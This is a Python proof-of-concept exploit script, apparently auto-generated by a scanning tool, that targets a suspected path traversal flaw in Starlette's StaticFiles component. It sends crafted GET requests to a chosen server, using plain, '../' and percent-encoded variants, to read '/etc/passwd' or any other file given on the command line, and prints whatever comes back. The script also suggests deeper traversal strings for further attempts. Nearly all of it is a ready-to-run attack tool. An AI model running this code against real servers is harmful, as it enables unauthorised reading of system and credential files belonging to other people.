#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: suspicious-009
# Sink: get_response
# Auto-generated — run with: python3 lfi_get_response_method_staticfiles_get_response.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette StaticFiles LFI via path traversal bypass.

This script attempts to exploit a potential Local File Inclusion (LFI) vulnerability
in Starlette's StaticFiles component. The vulnerability arises if the `lookup_path`
method can be bypassed (e.g., via path traversal sequences like `../` or symlinks),
allowing an attacker to read arbitrary files outside the intended static directory.

The exploit sends a GET request with a crafted path to the static file endpoint.
If successful, the contents of `/etc/passwd` (or a benign test file) will be returned.

Usage:
    python3 starlette_lfi_poc.py [--target http://localhost:8000] [--payload /etc/passwd]

Requirements:
    - Python 3.6+
    - requests library (pip install requests)
"""

import argparse
import sys
import requests

# Default target URL (change as needed)
DEFAULT_TARGET = "http://localhost:8000"
# Default benign payload (reads a harmless file to confirm LFI)
DEFAULT_PAYLOAD = "/etc/passwd"


def exploit_lfi(target_url: str, payload_path: str) -> None:
    """
    Attempt to exploit LFI by requesting a crafted path from the static file endpoint.

    Args:
        target_url: Base URL of the Starlette application (e.g., http://localhost:8000)
        payload_path: Path to the file to read (e.g., /etc/passwd or ../../etc/passwd)
    """
    # Construct the full URL. The static files are typically served under /static/
    # but the exact mount point depends on the application. We try a few common patterns.
    # The payload may need traversal sequences like ../ to escape the static directory.
    # We'll try both with and without /static prefix.
    
    # Normalize the payload: remove leading slash if present, add traversal
    # The exact traversal depth depends on the static directory depth.
    # We'll try a few common variations.
    
    # Variation 1: Direct path traversal from root (if static is mounted at /)
    url_v1 = f"{target_url.rstrip('/')}/{payload_path.lstrip('/')}"
    
    # Variation 2: Under /static/ prefix
    url_v2 = f"{target_url.rstrip('/')}/static/{payload_path.lstrip('/')}"
    
    # Variation 3: With ../ to go up one level (if static is at /static/)
    url_v3 = f"{target_url.rstrip('/')}/static/../{payload_path.lstrip('/')}"
    
    # Variation 4: Double encoding or other tricks (optional)
    # For now, we test the basic ones.
    
    urls_to_try = [url_v1, url_v2, url_v3]
    
    # Also try with URL-encoded path traversal
    encoded_payload = payload_path.replace("/", "%2F").replace("..", "%2E%2E")
    url_v4 = f"{target_url.rstrip('/')}/static/{encoded_payload}"
    urls_to_try.append(url_v4)
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {payload_path}")
    print("[*] Attempting LFI...\n")
    
    for i, url in enumerate(urls_to_try, 1):
        try:
            print(f"[*] Trying URL variant {i}: {url}")
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            # Check if we got a successful response (200) and content is not empty
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] SUCCESS! Status: {response.status_code}")
                print(f"[+] Response length: {len(response.text)} bytes")
                print(f"[+] Content preview:\n{response.text[:500]}")
                
                # If we read /etc/passwd, look for common patterns
                if "root:" in response.text or "nobody:" in response.text:
                    print("[!] Confirmed: /etc/passwd contents detected!")
                return
            elif response.status_code == 404:
                print(f"[-] 404 Not Found (file not accessible at this path)")
            elif response.status_code == 403:
                print(f"[-] 403 Forbidden (access denied)")
            else:
                print(f"[-] Status: {response.status_code} (unexpected)")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error: Could not reach {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout: Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[-] Exploit attempt completed. No successful LFI detected with these payloads.")
    print("[*] Note: The vulnerability may require specific traversal depth or encoding.")
    print("[*] Try adjusting the payload (e.g., ../../../../etc/passwd) or target path.")


def main():
    parser = argparse.ArgumentParser(
        description="Starlette StaticFiles LFI Proof-of-Concept Exploit"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help=f"File path to read (default: {DEFAULT_PAYLOAD})"
    )
    args = parser.parse_args()
    
    # Sanity check: ensure target URL is valid
    if not args.target.startswith(("http://", "https://")):
        print("[!] Target URL must start with http:// or https://")
        sys.exit(1)
    
    # Run the exploit
    exploit_lfi(args.target, args.payload)


if __name__ == "__main__":
    main()
